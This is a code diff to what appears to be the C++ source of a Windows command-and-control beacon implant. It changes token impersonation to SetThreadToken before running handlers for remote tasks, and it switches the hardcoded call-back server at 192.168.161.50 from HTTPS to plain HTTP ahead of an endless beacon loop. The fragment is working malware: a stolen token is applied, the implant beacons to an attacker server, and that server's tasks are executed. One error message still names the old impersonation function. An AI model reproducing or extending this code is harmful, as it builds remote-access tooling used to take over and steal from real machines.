@@ -163,7 +163,9 @@ void BeaconMain(shared_ptr<Beacon> beacon, std::chrono::time_point<std::chrono::
                 auto it_2 = sysHandlers.find(it->type());
                 auto htoken = token::getToken();
                 if (htoken != INVALID_HANDLE_VALUE) {
-                    ImpersonateLoggedOnUser(token::getToken());
+                    auto res = SetThreadToken(NULL,token::getToken());
+                    if (res == FALSE)
+                        std::cout << "ImpersonateLoggedOnUser failed with error: " << GetLastError() << std::endl;
                 }
                 auto res = it_2->second(it->id(), it->data());
                 if (htoken != INVALID_HANDLE_VALUE) {
@@ -522,12 +524,12 @@ int Entry() {
 #endif
 #endif
 #ifdef HTTP
-    unique_ptr<IClient> cli = make_unique<HttpClient>(string{ "https://192.168.161.50" }, 10, 10, 10);
+    unique_ptr<IClient> cli = make_unique<HttpClient>(string{ "http://192.168.161.50" }, 10, 10, 10);
 #endif
     //  PIVOT
 
     instanceID = uuids::to_string(uuids::uuid_system_generator{}());
-    shared_ptr<Beacon> beacon = make_shared<Beacon>("https://192.168.161.50", cli);
+    shared_ptr<Beacon> beacon = make_shared<Beacon>("http://192.168.161.50", cli);
     while (1) {
         BeaconMainLoop(beacon);
 
